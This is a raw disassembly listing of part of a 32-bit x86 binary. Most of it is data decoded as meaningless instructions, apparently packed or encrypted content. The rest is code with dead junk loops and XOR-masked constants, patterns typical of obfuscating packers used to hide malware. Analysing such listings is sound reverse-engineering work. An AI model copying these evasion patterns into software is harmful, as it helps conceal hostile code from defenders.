  408f0a:	imul   ecx,DWORD PTR [ebx+0x34d314e8],0x900337fe
  408f14:	add    DWORD PTR [edx],0xbc59e6a0
  408f1a:	mov    bl,0x25
  408f1c:	cs push 0x11
  408f1f:	loop   0x408efb
  408f21:	dec    ecx
  408f22:	(bad)  
  408f23:	pop    eax
  408f24:	retf   
  408f25:	arpl   WORD PTR [edx],ax
  408f27:	xchg   esp,eax
  408f28:	(bad)  
  408f29:	fcmovnu st,st(0)
  408f2b:	aas    
  408f2c:	xchg   ecx,eax
  408f2d:	ds in  al,0xba
  408f30:	aas    
  408f31:	je     0x408ee3
  408f33:	add    al,0xc7
  408f35:	(bad)  
  408f36:	fst    st(2)
  408f38:	jb     0x408fa6
  408f3a:	dec    ecx
  408f3b:	xchg   esp,eax
  408f3c:	sahf   
  408f3d:	push   edi
  408f3e:	mov    cl,0x48
  408f40:	sub    eax,0xe3986156
  408f45:	fiadd  DWORD PTR [ebx]
  408f47:	jmp    0x496a2771
  408f4c:	cmp    eax,0x9af2abaa
  408f51:	xchg   BYTE PTR es:[ecx-0xbd3b6b0],dl
  408f58:	pop    ds
  408f59:	mov    esi,DWORD PTR [ecx-0x10932025]
  408f5f:	stc    
  408f60:	xchg   edi,eax
  408f61:	pop    ebx
  408f62:	sub    DWORD PTR [ebx+0x52],ecx
  408f65:	sub    al,al
  408f67:	in     al,0x84
  408f69:	stc    
  408f6a:	inc    edx
  408f6b:	scas   al,BYTE PTR es:[edi]
  408f6c:	pop    ds
  408f6d:	cli    
  408f6e:	lea    ebp,[eax+edx*4]
  408f71:	das    
  408f72:	add    eax,0xe3192583
  408f77:	scas   al,BYTE PTR es:[edi]
  408f78:	rcr    DWORD PTR [edi],cl
  408f7a:	mov    al,0x48
  408f7c:	loop   0x408f3e
  408f7e:	jp     0x408fb3
  408f80:	in     al,0xb7
  408f82:	push   cs
  408f83:	push   0x3d
  408f85:	xchg   DWORD PTR [edx+eax*8-0x3e],esi
  408f89:	sbb    al,0x48
  408f8b:	jle    0x408fb6
  408f8d:	clc    
  408f8e:	cmp    DWORD PTR [eax+0x5a],eax
  408f91:	mov    eax,ebp
  408f93:	loopne 0x408f76
  408f95:	imul   ebx,DWORD PTR [edi+0x787ee60c],0x71f391e9
  408f9f:	xchg   ebp,eax
  408fa0:	xor    bh,BYTE PTR [esi-0x838ad4]
  408fa6:	adc    eax,0x9637536a
  408fab:	jecxz  0x408fe8
  408fad:	inc    ecx
  408fae:	daa    
  408faf:	imul   esp,DWORD PTR [esi+0x67],0x4a
  408fb3:	int3   
  408fb4:	mov    dh,0x83
  408fb6:	sti    
  408fb7:	aam    0xc9
  408fb9:	mov    ds:0x9f02426c,al
  408fbe:	jns    0x408f87
  408fc0:	cli    
  408fc1:	inc    ebp
  408fc2:	mov    eax,0x36868e13
  408fc7:	and    eax,0x87a6251
  408fcc:	mov    DWORD PTR [esi],0x406824e4
  408fd2:	mov    ebp,0x1c26d716
  408fd7:	pop    esp
  408fd8:	mov    eax,ds:0xbe49570a
  408fdd:	jns    0x408f75
  408fdf:	mov    ah,0xc
  408fe1:	xchg   edi,eax
  408fe2:	fdiv   QWORD PTR [ebx]
  408fe4:	mov    BYTE PTR [edi-0x7f],ah
  408fe7:	ins    DWORD PTR es:[edi],dx
  408fe8:	inc    ecx
  408fe9:	push   ecx
  408fea:	lock sub DWORD PTR [edx+0x4844c52b],edx
  408ff1:	xor    DWORD PTR [ecx],eax
  408ff3:	enter  0x9dd4,0x3f
  408ff7:	dec    ebx
  408ff8:	and    eax,0x7f1ee56a
  408ffd:	clc    
  408ffe:	jno    0x40900e
  409000:	repnz ds push cs
  409003:	push   ebx
  409004:	or     eax,0x830f81b0
  409009:	sub    ebx,esp
  40900b:	(bad)  
  40900c:	test   BYTE PTR [esi-0x1b],0x4d
  409010:	xchg   esi,eax
  409011:	xchg   ecx,eax
  409012:	pusha  
  409013:	cmp    eax,0xbeaea689
  409018:	(bad)  
  409019:	sbb    DWORD PTR [eax],ebx
  40901b:	or     bl,BYTE PTR [edx-0x49961fa8]
  409021:	das    
  409022:	lods   al,BYTE PTR ds:[esi]
  409023:	(bad)  
  409024:	pop    ecx
  409025:	test   BYTE PTR [esi+0xefe3543],al
  40902b:	adc    BYTE PTR [edi-0x6b],cl
  40902e:	les    ebx,FWORD PTR [ebp-0x43]
  409031:	jb     0x40906e
  409033:	outs   dx,BYTE PTR ds:[esi]
  409034:	pop    edi
  409035:	ja     0x408fbb
  409037:	outs   dx,DWORD PTR ds:[esi]
  409038:	fmul   DWORD PTR [eax+0x66]
  40903b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40903c:	pop    ds
  40903d:	pop    edi
  40903e:	dec    esp
  40903f:	jl     0x4090ab
  409041:	add    esi,DWORD PTR [ebx+0x43e5f44d]
  409047:	dec    esi
  409048:	dec    esp
  409049:	xchg   BYTE PTR [edi-0x27],ah
  40904c:	stos   BYTE PTR es:[edi],al
  40904d:	inc    edx
  40904e:	inc    ebp
  40904f:	cmp    al,0xcd
  409051:	fisub  DWORD PTR [edi]
  409053:	and    eax,0xa0548769
  409058:	clc    
  409059:	push   ebx
  40905a:	jne    0x409031
  40905c:	inc    esi
  40905d:	jecxz  0x408fea
  40905f:	push   esp
  409060:	ror    DWORD PTR [ebp+ebp*4-0x32],1
  409064:	fwait
  409065:	add    edx,DWORD PTR [ebx+ecx*8+0x6c9759e5]
  40906c:	retf   0xc6
  40906f:	(bad)  
  409070:	mov    dh,0xf9
  409072:	mov    esp,0xa6fb215d
  409077:	nop
  409078:	imul   edi,DWORD PTR [ebp-0x8a6767f],0x8724ef23
  409082:	outs   dx,BYTE PTR ds:[esi]
  409083:	jno    0x409066
  409085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409086:	push   ebx
  409087:	fsubr  st(7),st
  409089:	adc    BYTE PTR [ecx-0x17441935],ah
  40908f:	mov    BYTE PTR [edi-0x24],dl
  409092:	mul    DWORD PTR [edi-0x12]
  409095:	shr    DWORD PTR [ecx],1
  409097:	ror    BYTE PTR [ebp-0x1eb62ee],cl
  40909d:	mov    ecx,0x97c0735a
  4090a2:	shl    DWORD PTR [esi-0x24],1
  4090a5:	mov    esi,0xe69fe9c9
  4090aa:	out    dx,al
  4090ab:	mov    DWORD PTR ds:0x46d02b8d,esp
  4090b1:	adc    esi,DWORD PTR [esi+0x44]
  4090b4:	(bad)  
  4090b5:	les    eax,FWORD PTR [ecx-0x6b]
  4090b8:	and    BYTE PTR [eax+0x285e2b8a],dl
  4090be:	mov    ?,edx
  4090c0:	das    
  4090c1:	mov    al,0x2b
  4090c3:	fild   WORD PTR [edx+0x12d1421]
  4090ca:	sti    
  4090cb:	out    0xca,eax
  4090cd:	fimul  DWORD PTR [ebp+0xab3067a]
  4090d3:	popa   
  4090d4:	lea    esi,[edi]
  4090d6:	jns    0x4090ec
  4090d8:	rol    BYTE PTR [edx],cl
  4090da:	sub    eax,DWORD PTR [edi]
  4090dc:	push   0x39c0e2b2
  4090e1:	push   cs
  4090e2:	pop    esp
  4090e3:	xchg   esi,eax
  4090e4:	arpl   WORD PTR [ecx-0x7e],dx
  4090e7:	retf   
  4090e8:	or     dl,dh
  4090ea:	push   cs
  4090eb:	test   BYTE PTR [ebp-0x4acd35c6],bl
  4090f1:	daa    
  4090f2:	out    dx,eax
  4090f3:	int    0x3a
  4090f5:	adc    dh,BYTE PTR es:[esi-0x69]
  4090f9:	stos   DWORD PTR es:[edi],eax
  4090fa:	(bad)  
  4090fb:	dec    DWORD PTR [eax]
  4090fd:	mov    ds:0xc7209c3f,al
  409102:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409103:	pop    ebx
  409104:	jge    0x409134
  409106:	sbb    eax,0x89ae07e
  40910b:	xlat   BYTE PTR ds:[ebx]
  40910c:	fwait
  40910d:	or     DWORD PTR [esi-0x23c806a8],0xb22898b7
  409117:	into   
  409118:	lea    ebx,[esi-0x26a6128f]
  40911e:	in     eax,dx
  40911f:	adc    ah,BYTE PTR [esi+0x21]
  409122:	cmp    al,0x64
  409124:	xchg   esp,eax
  409125:	les    edi,FWORD PTR [edx+0x5b]
  409128:	inc    ebp
  409129:	sub    DWORD PTR [edi-0x5d],ecx
  40912c:	mov    al,0xde
  40912e:	cld    
  40912f:	das    
  409130:	cdq    
  409131:	stos   DWORD PTR es:[edi],eax
  409132:	fucomip st,st(2)
  409134:	popf   
  409135:	or     eax,0x80c73ac3
  40913a:	mov    ds,WORD PTR [ebx+0x11]
  40913d:	enter  0x3b9f,0xde
  409141:	pop    esi
  409142:	mov    edi,0xb9fdaa04
  409147:	cmc    
  409148:	(bad)  
  409149:	or     dh,BYTE PTR [edx+0xd64aa94]
  40914f:	aaa    
  409150:	popa   
  409151:	mov    ds:0x1c968a01,eax
  409156:	lahf   
  409157:	adc    BYTE PTR [ecx-0xd],ch
  40915a:	mov    dh,0x2c
  40915c:	lea    ebp,[ecx-0x51]
  40915f:	sub    eax,0xdcc577b7
  409164:	mul    BYTE PTR ds:[ecx-0x58]
  409168:	into   
  409169:	pop    eax
  40916a:	mov    dh,0xe1
  40916c:	xor    ebp,DWORD PTR [edx-0x29]
  40916f:	jns    0x40911e
  409171:	or     DWORD PTR [ecx],0xffffffee
  409174:	(bad)  
  409175:	dec    ebx
  409176:	xchg   ebx,eax
  409177:	inc    edx
  409178:	cmc    
  409179:	aas    
  40917a:	jmp    0x5de3bdc1
  40917f:	daa    
  409180:	lahf   
  409181:	and    BYTE PTR [esi+0x19673648],ch
  409187:	mov    ecx,0xd996325e
  40918c:	dec    ebx
  40918d:	pop    es
  40918e:	dec    eax
  40918f:	add    al,0x95
  409191:	xor    dl,0x28
  409194:	xchg   edi,eax
  409195:	rol    edx,1
  409197:	retf   0x5c2d
  40919a:	stc    
  40919b:	xchg   ebp,eax
  40919c:	adc    eax,DWORD PTR [ebx-0x35217cbb]
  4091a2:	fcomi  st,st(3)
  4091a4:	or     dl,BYTE PTR [edx+0x77]
  4091a7:	mov    dl,0x9f
  4091a9:	mov    ds:0xe9a1711b,al
  4091ae:	add    ebp,DWORD PTR [ebp-0x7a]
  4091b1:	fist   WORD PTR [edi-0x6aaa2b91]
  4091b7:	rol    DWORD PTR [eax-0x7ff79809],1
  4091bd:	xor    al,0xab
  4091bf:	mov    ch,BYTE PTR [esp+ebx*8-0x200bdc3c]
  4091c6:	retf   
  4091c7:	dec    edx
  4091c8:	mov    ecx,0x3c4313e6
  4091cd:	mov    edx,0xb3dc0879
  4091d2:	push   ecx
  4091d3:	jmp    0xfd2bd8c3
  4091d8:	dec    ecx
  4091d9:	push   ss
  4091da:	inc    edx
  4091db:	push   0x8e6c95da
  4091e0:	push   edx
  4091e1:	inc    esp
  4091e2:	int3   
  4091e3:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091e5:	into   
  4091e6:	inc    ecx
  4091e7:	sub    eax,0x6c5d4d9c
  4091ec:	scas   al,BYTE PTR es:[edi]
  4091ed:	inc    esi
  4091ee:	cli    
  4091ef:	adc    eax,0x3dddf560
  4091f4:	add    eax,0xb93d3ffa
  4091f9:	push   edi
  4091fa:	xchg   esp,eax
  4091fb:	xchg   BYTE PTR [eax],al
  4091fd:	sub    ebx,DWORD PTR gs:[ebx-0x4b]
  409201:	je     0x409218
  409203:	pop    ebp
  409204:	pop    ds
  409205:	cmp    ch,dh
  409207:	adc    al,0x70
  409209:	cmc    
  40920a:	sub    al,0xe0
  40920c:	rcr    DWORD PTR [edx],1
  40920e:	icebp  
  40920f:	xchg   BYTE PTR [eax-0x34],bh
  409212:	iret   
  409213:	rcr    DWORD PTR [eax-0x72],0x88
  409217:	add    al,dl
  409219:	les    ebp,FWORD PTR [ebp-0x21]
  40921c:	out    0x45,al
  40921e:	leave  
  40921f:	mov    dl,0xb4
  409221:	push   edx
  409222:	jg     0x40920a
  409224:	fwait
  409225:	mov    cl,0x34
  409227:	outs   dx,BYTE PTR ds:[esi]
  409228:	sbb    al,0x73
  40922a:	fimul  WORD PTR [ebx-0x1efd6fa6]
  409230:	xor    cl,BYTE PTR [esp+ebx*2]
  409233:	or     DWORD PTR [esi+0x4052b9fc],esp
  409239:	dec    edi
  40923a:	sbb    dh,BYTE PTR [esi]
  40923c:	dec    edi
  40923d:	int3   
  40923e:	mov    WORD PTR [ebx-0x1a70358e],ss
  409244:	repnz test al,ah
  409247:	mov    al,ds:0xcad5aed1
  40924c:	rcr    BYTE PTR [ecx+0x74],0xbd
  409250:	call   0x67f0:0xa7d49052
  409257:	mov    esi,DWORD PTR [eax]
  409259:	pop    ebx
  40925a:	jae    0x40927e
  40925c:	inc    edi
  40925d:	mov    DWORD PTR fs:[eax+0x5f],edi
  409261:	clc    
  409262:	std    
  409263:	in     eax,0x17
  409265:	shl    ecx,1
  409267:	mov    al,ds:0xfef97ef4
  40926c:	and    eax,0xceaf542e
  409271:	in     eax,dx
  409272:	xlat   BYTE PTR ds:[ebx]
  409273:	sbb    eax,0xb63f02ac
  409278:	xor    eax,0xf0a214fd
  40927d:	neg    edi
  40927f:	push   edx
  409280:	xchg   edi,eax
  409281:	xchg   edi,eax
  409282:	dec    edx
  409283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409284:	stc    
  409285:	es inc edx
  409287:	pushf  
  409288:	cmp    ecx,esp
  40928a:	cdq    
  40928b:	out    0x50,eax
  40928d:	dec    esp
  40928e:	push   edx
  40928f:	lods   al,BYTE PTR ds:[esi]
  409290:	push   0x11
  409292:	(bad)  
  409293:	(bad)  
  409295:	stos   BYTE PTR es:[edi],al
  409296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409297:	adc    edi,DWORD PTR [ecx+0x4831d46]
  40929d:	push   ecx
  40929e:	mov    ebp,0xcd6c8cac
  4092a3:	fnstsw ax
  4092a5:	shr    BYTE PTR [esi+eiz*1],cl
  4092a8:	mov    ebp,0x2987cd23
  4092ad:	daa    
  4092ae:	clc    
  4092af:	push   0x5a733683
  4092b4:	test   eax,0xaebc25cb
  4092b9:	clc    
  4092ba:	inc    edi
  4092bb:	loope  0x4092ef
  4092bd:	repz test DWORD PTR [ebp+0x435933a7],eax
  4092c4:	pop    ds
  4092c5:	in     al,0x2a
  4092c7:	test   DWORD PTR [ebx-0x3],ebp
  4092ca:	mov    eax,0xb58ff2d8
  4092cf:	mov    ecx,0x8c802bae
  4092d4:	(bad)  
  4092d5:	jbe    0x40933e
  4092d7:	push   es
  4092d8:	sbb    cl,bl
  4092da:	push   cs
  4092db:	xchg   edx,eax
  4092dc:	aam    0x87
  4092de:	iret   
  4092df:	pop    es
  4092e0:	iret   
  4092e1:	pop    es
  4092e2:	rcl    DWORD PTR [esi-0xa],1
  4092e5:	add    ebp,DWORD PTR [ecx+0x42]
  4092e8:	pop    ds
  4092e9:	ins    DWORD PTR es:[edi],dx
  4092ea:	inc    ecx
  4092eb:	xlat   BYTE PTR ds:[ebx]
  4092ec:	mov    al,0x9b
  4092ee:	cmp    al,0x62
  4092f0:	scas   eax,DWORD PTR es:[edi]
  4092f1:	cwde   
  4092f2:	cdq    
  4092f3:	inc    eax
  4092f4:	sub    DWORD PTR [esi],0x2f3f6f9f
  4092fa:	out    dx,al
  4092fb:	inc    ecx
  4092fc:	pop    ebp
  4092fd:	jmp    0x40934b
  4092ff:	push   0x7b
  409301:	and    bh,dl
  409303:	jb     0x409358
  409305:	test   eax,0xe6412dcb
  40930a:	lock inc esp
  40930c:	jbe    0x40933f
  40930e:	and    ah,bl
  409310:	lods   al,BYTE PTR ds:[esi]
  409311:	(bad)  
  409312:	jmp    0x40935e
  409314:	scas   eax,DWORD PTR es:[edi]
  409315:	test   BYTE PTR es:[ebp+0x42],bl
  409319:	pop    ss
  40931a:	(bad)  
  40931b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40931c:	mov    al,ds:0x81df5b7f
  409321:	aad    0x60
  409323:	xchg   ecx,eax
  409324:	xchg   edx,eax
  409325:	das    
  409326:	bndstx [ecx+edx*1],bnd2
  40932a:	mov    edx,0x55e22be2
  40932f:	xchg   edi,eax
  409330:	mov    ebp,DWORD PTR [edx+edi*4+0x5e]
  409334:	mov    ebp,0xfed5eac3
  409339:	out    dx,al
  40933a:	xor    al,0xba
  40933c:	inc    eax
  40933d:	(bad)  
  409340:	mov    bh,BYTE PTR [ebp+0xe]
  409343:	gs enter 0x8de1,0xf7
  409348:	push   esp
  409349:	imul   esp,edi,0x8bd2c27a
  40934f:	clc    
  409350:	push   ecx
  409351:	data16 and al,0xc1
  409354:	jge    0x409317
  409356:	xor    ebp,esp
  409358:	out    0xf8,al
  40935a:	xor    DWORD PTR [esi],ebp
  40935c:	int3   
  40935d:	pop    ss
  40935e:	push   ss
  40935f:	jmp    0x3db6608e
  409364:	or     eax,0x886e608a
  409369:	loop   0x409337
  40936b:	push   es
  40936c:	xor    ah,dh
  40936e:	dec    edi
  40936f:	iret   
  409370:	xchg   ecx,eax
  409371:	push   ss
  409372:	dec    ecx
  409373:	xor    eax,0x993f9cfc
  409378:	push   cs
  409379:	inc    edx
  40937a:	sub    ebx,esi
  40937c:	shl    DWORD PTR [ecx+0x7f],0x6b
  409380:	bound  edi,QWORD PTR [ebx]
  409382:	xor    BYTE PTR [edx-0x707780e1],al
  409388:	and    BYTE PTR [ebp+0x39],0xd2
  40938c:	punpckhwd mm3,QWORD PTR [edx+0x4852d83d]
  409393:	(bad)  
  409394:	mov    ebp,DWORD PTR [ecx]
  409396:	xchg   ebp,eax
  409397:	daa    
  409398:	mov    dh,0x22
  40939a:	jae    0x40937e
  40939c:	xor    BYTE PTR [ecx+eax*2],0xf7
  4093a0:	in     al,0xd7
  4093a2:	inc    ecx
  4093a3:	jbe    0x4093df
  4093a5:	sub    ch,BYTE PTR [edx]
  4093a7:	pop    esp
  4093a8:	mov    ch,0xc0
  4093aa:	add    bl,cl
  4093ac:	push   0x856c76ae
  4093b1:	pop    ebp
  4093b2:	clc    
  4093b3:	jmp    0x51e5:0xd507a66
  4093ba:	shl    dl,1
  4093bc:	mul    BYTE PTR [ebp+0x5f]
  4093bf:	or     al,0xbf
  4093c1:	fimul  DWORD PTR [edi]
  4093c3:	cmp    dh,BYTE PTR [edx]
  4093c5:	retf   0x2139
  4093c8:	sub    DWORD PTR [edx+0x7d],esp
  4093cb:	mov    al,ds:0x28f6659c
  4093d0:	mov    dh,0x4f
  4093d2:	sbb    ecx,DWORD PTR [edi+0xa2ec5da]
  4093d8:	call   0x313d47a
  4093dd:	cmp    al,0x3c
  4093df:	sbb    eax,0xabbe6878
  4093e4:	aam    0x3a
  4093e6:	out    dx,eax
  4093e7:	test   eax,0xfaa5c22f
  4093ec:	popa   
  4093ed:	xchg   ebp,eax
  4093ee:	mov    DWORD PTR [bp+si+0x49],esi
  4093f2:	xor    ebx,0xbc93e140
  4093f8:	es or  al,0xb9
  4093fb:	mov    esi,0xf06c6724
  409400:	jmp    edx
  409402:	in     al,0x51
  409404:	pushf  
  409405:	test   eax,0x4f8e964
  40940a:	xchg   DWORD PTR [eax],ecx
  40940c:	retf   0xa5d8
  40940f:	push   ebx
  409410:	data16 jg 0x40946f
  409413:	or     eax,0x51251f40
  409418:	imul   edx,edi,0xfffffffe
  40941b:	pusha  
  40941c:	xchg   DWORD PTR [ecx-0x544f55ec],esi
  409422:	push   edx
  409423:	js     0x4093f4
  409425:	sub    al,0x2b
  409427:	jo     0x409448
  409429:	inc    esi
  40942b:	add    BYTE PTR [eax+0x2b],ch
  40942e:	xchg   esi,eax
  40942f:	icebp  
  409430:	out    dx,eax
  409431:	enter  0x8829,0x1e
  409435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409436:	outs   dx,BYTE PTR ds:[esi]
  409437:	cmc    
  409438:	mov    bl,0x8c
  40943a:	cmp    DWORD PTR [esi+0x54],eax
  40943d:	pop    esi
  40943e:	je     0x40944c
  409444:	mov    eax,DWORD PTR [ebp+0x8]
  409447:	jmp    0x409453
  40944c:	mov    eax,DWORD PTR [ebp-0x4]
  40944f:	xor    eax,ecx
  409451:	add    eax,edx
  409453:	leave  
  409454:	ret    0x4
  409457:	push   ebp
  409458:	mov    ebp,esp
  40945a:	sub    esp,0x38
  40945d:	mov    DWORD PTR ds:0x42e020,0x15
  409467:	cmp    DWORD PTR ds:0x42e020,0x0
  40946e:	je     0x4094bf
  409474:	cmp    DWORD PTR ds:0x42e020,0xa
  40947b:	jg     0x4094bf
  409481:	jmp    0x409491
  409486:	push   0x1284
  40948b:	call   DWORD PTR ds:0x434917
  409491:	cmp    DWORD PTR ds:0x42e020,0xb
  409498:	jne    0x4094ac
  40949e:	xor    eax,eax
  4094a0:	xor    eax,DWORD PTR ds:0x42e020
  4094a6:	dec    eax
  4094a7:	mov    ds:0x42e020,eax
  4094ac:	xor    eax,eax
  4094ae:	xor    eax,DWORD PTR ds:0x42e020
  4094b4:	dec    eax
  4094b5:	mov    ds:0x42e020,eax
  4094ba:	jmp    0x409467
  4094bf:	mov    DWORD PTR [ebp-0x4],0xf89c8581
  4094c6:	mov    eax,ds:0x42e020
  4094cb:	sub    DWORD PTR ds:0x42e010,eax
  4094d1:	push   ebx
  4094d2:	sbb    DWORD PTR ds:0x42e018,edx
  4094d8:	mov    DWORD PTR [ebp-0xc],0xf89c8580
  4094df:	mov    DWORD PTR ds:0x430018,0x1c
  4094e9:	cmp    DWORD PTR ds:0x430018,0x0
  4094f0:	je     0x409540
  4094f6:	cmp    DWORD PTR ds:0x430018,0xb
  4094fd:	ja     0x409540
  409503:	jmp    0x409518
  409508:	push   0x434027
  40950d:	push   0x400000
  409512:	call   DWORD PTR ds:0x43491f
  409518:	cmp    DWORD PTR ds:0x430018,0xc
  40951f:	jne    0x409530
  409525:	mov    eax,ds:0x430018
  40952a:	dec    eax
  40952b:	mov    ds:0x430018,eax
  409530:	mov    eax,ds:0x430018
  409535:	dec    eax
  409536:	mov    ds:0x430018,eax
  40953b:	jmp    0x4094e9
  409540:	mov    eax,DWORD PTR [ebp-0x4]
  409543:	xor    DWORD PTR ds:0x42f018,0x430004
  40954d:	push   esi
  40954e:	add    DWORD PTR ds:0x430000,0x7b7d
  409558:	mov    esi,0x751089d
  40955d:	xor    eax,esi
  40955f:	or     DWORD PTR ds:0x432010,0x1402
  409569:	push   edi
  40956a:	mov    edi,0x3272e4
  40956f:	dec    DWORD PTR ds:0x42f018
  409575:	add    eax,edi
  409577:	sbb    DWORD PTR ds:0x430010,0x432014
  409581:	mov    DWORD PTR [ebp-0x1c],eax
  409584:	mov    eax,DWORD PTR [ebp+0x14]
  409587:	add    DWORD PTR ds:0x432018,0x30e0
  409591:	test   eax,eax
  409593:	mov    DWORD PTR ds:0x42e014,0x1e76
  40959d:	je     0x4095bb
  4095a3:	mov    eax,DWORD PTR [ebp+0x14]
  4095a6:	and    ebx,DWORD PTR ds:0x43101c
  4095ac:	mov    eax,DWORD PTR [eax]
  4095ae:	add    DWORD PTR ds:0x430014,0x50e4
  4095b8:	mov    DWORD PTR [ebp-0x1c],eax
  4095bb:	and    DWORD PTR ds:0x42e010,0x0
  4095c5:	mov    eax,ds:0x42e010
  4095ca:	inc    eax
  4095cb:	mov    ds:0x42e010,eax
  4095d0:	cmp    DWORD PTR ds:0x42e010,0x10
  4095d7:	jb     0x409615
  4095dd:	jmp    0x4095f0
  4095e2:	push   DWORD PTR [ebp-0x14]
  4095e5:	push   0x371c
  4095ea:	call   DWORD PTR ds:0x434923
  4095f0:	cmp    DWORD PTR ds:0x42e010,0xf
  4095f7:	jne    0x409608
  4095fd:	mov    eax,ds:0x42e010
  409602:	inc    eax
  409603:	mov    ds:0x42e010,eax
  409608:	cmp    DWORD PTR ds:0x42e010,0x1e
  40960f:	jb     0x4095c5
  409615:	mov    eax,DWORD PTR [ebp-0x4]
  409618:	movzx  ebx,WORD PTR ds:0x432000
  40961f:	sub    ebx,DWORD PTR ds:0x43101c
  409625:	mov    DWORD PTR ds:0x432000,ebx
  40962b:	xor    eax,esi
  40962d:	and    DWORD PTR ds:0x432014,0xc31
  409637:	add    eax,edi
  409639:	mov    DWORD PTR [ebp-0x8],eax
  40963c:	mov    eax,ds:0x41d05a
  409641:	xor    ebx,ebx
  409643:	or     ebx,DWORD PTR ds:0x41d09a
  409649:	sub    eax,ebx
  40964b:	imul   eax,DWORD PTR [eax+ebx*1]
  40964f:	mov    eax,DWORD PTR [ebp-0xc]
  409652:	and    DWORD PTR ds:0x432018,0x0
  40965c:	jmp    0x40966e
  409661:	mov    ebx,DWORD PTR ds:0x432018
  409667:	inc    ebx
  409668:	mov    DWORD PTR ds:0x432018,ebx
  40966e:	cmp    DWORD PTR ds:0x432018,0x19
  409675:	jae    0x4096b7
  40967b:	cmp    DWORD PTR ds:0x432018,0xb
  409682:	ja     0x4096b7
  409688:	jmp    0x409698
  40968d:	push   0x434027
  409692:	call   DWORD PTR ds:0x434927
  409698:	cmp    DWORD PTR ds:0x432018,0xa
  40969f:	jne    0x4096b2
  4096a5:	mov    ebx,DWORD PTR ds:0x432018
  4096ab:	inc    ebx
  4096ac:	mov    DWORD PTR ds:0x432018,ebx
  4096b2:	jmp    0x409661
  4096b7:	xor    eax,esi
  4096b9:	and    DWORD PTR ds:0x431010,edi
  4096bf:	add    eax,edi
  4096c1:	and    DWORD PTR ds:0x42e010,0x6068
  4096cb:	mov    DWORD PTR [ebp-0x24],eax
  4096ce:	xor    ebx,DWORD PTR ds:0x432014
  4096d4:	mov    eax,DWORD PTR [ebp-0x4]
  4096d7:	add    ebx,DWORD PTR ds:0x42e008
  4096dd:	xor    eax,esi
  4096df:	add    eax,edi
  4096e1:	sub    DWORD PTR ds:0x42e000,ebx
  4096e7:	mov    DWORD PTR [ebp-0x30],eax
  4096ea:	mov    ebx,DWORD PTR [ebp-0x4]
  4096ed:	sub    DWORD PTR ds:0x42e000,ebx
  4096f3:	xor    ebx,esi
  4096f5:	add    ebx,edi
  4096f7:	neg    eax
  4096f9:	mov    eax,DWORD PTR [ebp-0x24]
  4096fc:	sub    eax,edi
  4096fe:	lea    ecx,[ebx-0x3272e4]
  409704:	xor    eax,esi
  409706:	xor    ecx,esi
  409708:	cmp    ecx,eax
  40970a:	mov    DWORD PTR ds:0x42f00c,0xec8
  409714:	je     0x4099a1
  40971a:	mov    eax,DWORD PTR [ebp-0x4]
  40971d:	xor    eax,esi
  40971f:	mov    DWORD PTR ds:0x432000,0x24d7
  409729:	add    eax,edi
  40972b:	cmp    ebx,eax
  40972d:	jne    0x4098f1
  409733:	push   DWORD PTR [ebp+0x8]
  409736:	or     DWORD PTR ds:0x43000c,0x430014
  409740:	call   0x407014
  409745:	movzx  ecx,BYTE PTR ds:0x431008
  40974c:	add    DWORD PTR ds:0x42e01c,ecx
  409752:	mov    DWORD PTR [ebp-0x14],eax
  409755:	movzx  eax,BYTE PTR ds:0x43101c
  40975c:	xor    DWORD PTR ds:0x42e024,eax
  409762:	mov    eax,DWORD PTR [ebp-0x4]
  409765:	add    ecx,DWORD PTR ds:0x432014
  40976b:	mov    ecx,DWORD PTR [ebp-0x14]
  40976e:	xor    eax,esi
  409770:	add    eax,edi
  409772:	cmp    ecx,eax
  409774:	mov    DWORD PTR ds:0x42e01c,0x3286
  40977e:	je     0x409a0c
  409784:	push   DWORD PTR [ebp-0x14]
  409787:	and    DWORD PTR ds:0x431004,0x7397
  409791:	push   DWORD PTR [ebp+0x8]
  409794:	xor    DWORD PTR ds:0x430014,0x42e00c
  40979e:	call   0x40eb4e
  4097a3:	mov    DWORD PTR [ebp-0x14],eax
  4097a6:	or     eax,ecx
  4097a8:	mov    eax,DWORD PTR [ebp-0x4]
  4097ab:	mov    DWORD PTR ds:0x42e010,0x1a
  4097b5:	cmp    DWORD PTR ds:0x42e010,0x0
  4097bc:	je     0x409801
  4097c2:	cmp    DWORD PTR ds:0x42e010,0x27
  4097c9:	jb     0x409801
  4097cf:	jmp    0x4097ed
  4097d4:	push   DWORD PTR [ebp-0x28]
  4097d7:	push   DWORD PTR [ebp-0xc]
  4097da:	push   0x88bd
  4097df:	push   DWORD PTR [ebp-0x28]
  4097e2:	push   0x4a39
  4097e7:	call   DWORD PTR ds:0x4348b7
  4097ed:	xor    ecx,ecx
  4097ef:	or     ecx,DWORD PTR ds:0x42e010
  4097f5:	dec    ecx
  4097f6:	mov    DWORD PTR ds:0x42e010,ecx
  4097fc:	jmp    0x4097b5
  409801:	mov    ecx,DWORD PTR [ebp-0x14]
  409804:	xor    eax,esi
  409806:	inc    DWORD PTR ds:0x432008
  40980c:	add    eax,edi
  40980e:	mov    DWORD PTR ds:0x42e028,0x634f
  409818:	cmp    ecx,eax
  40981a:	mov    DWORD PTR ds:0x42f00c,0x55f
  409824:	je     0x409a0c
  40982a:	mov    eax,DWORD PTR [ebp-0x14]
  40982d:	mov    eax,DWORD PTR [eax+0x18]
  409830:	mov    DWORD PTR [ebp-0x24],eax
  409833:	mov    eax,DWORD PTR [ebp-0x14]
  409836:	inc    ecx
  409837:	mov    ecx,DWORD PTR [ebp+0x8]
  40983a:	sub    DWORD PTR ds:0x430000,0x42e008
  409844:	add    ecx,DWORD PTR [eax+0x20]
  409847:	and    DWORD PTR ds:0x431000,0x0
  409851:	jmp    0x409861
  409856:	mov    eax,ds:0x431000
  40985b:	inc    eax
  40985c:	mov    ds:0x431000,eax
  409861:	cmp    DWORD PTR ds:0x431000,0x1d
  409868:	jae    0x409898
  40986e:	cmp    DWORD PTR ds:0x431000,0x27
  409875:	jbe    0x409898
  40987b:	jmp    0x409893
  409880:	push   0x6890
  409885:	push   0x8109
  40988a:	push   DWORD PTR [ebp-0x1c]
